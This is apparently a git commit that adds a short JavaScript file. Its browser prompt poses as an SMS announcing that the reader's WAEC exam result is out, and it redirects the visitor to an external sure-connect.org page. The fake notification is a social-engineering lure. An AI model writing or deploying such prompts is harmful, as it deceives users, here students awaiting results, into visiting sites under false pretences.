dad48d9355a9e9a87df1798212a6932faf069e53
sureconnect001 <ukpe247@gmail.com>
2025-07-29 07:02:33 +0100

    Create waec-active.js

---
+++ waec-active.js
@@ -0,0 +1,5 @@
+var password = 'CHECK RESULT'
+password=prompt('SMS: Congratulations, your WAEC Result is out, click OK to check now','CHECK RESULT');
+if (password != 'CHECK RESULT') {
+location.href='https://sure-connect.org/waec.html';
+}
